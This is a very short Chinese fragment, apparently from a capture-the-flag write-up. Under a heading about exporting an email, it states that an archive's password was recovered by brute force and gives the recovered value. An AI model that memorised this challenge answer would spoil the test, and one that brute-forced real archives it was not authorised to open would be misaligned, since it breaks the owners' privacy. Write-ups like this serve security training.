## 导出邮件

爆破

得到压缩包密码：18763918468

